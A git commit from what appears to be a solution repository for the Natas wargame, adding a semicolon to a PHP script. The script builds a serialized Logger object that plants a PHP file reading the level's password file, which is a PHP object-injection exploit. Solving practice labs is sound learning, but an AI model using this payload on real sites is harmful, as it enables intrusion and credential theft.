e9398ae9254f40ee98e97e8cbd79fe4a6d6626f7
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-09-24 15:21:50 +1000

    added a forgotten semi colon

--- natas26/serialize.php
+++ natas26/serialize.php
@@ -1,7 +1,7 @@
 <?
     class Logger{
         private $logFile = "img/password.php";
-        private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>"
+        private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>";
     }
 
     print urlencode(base64_encode(serialize(new Logger)));
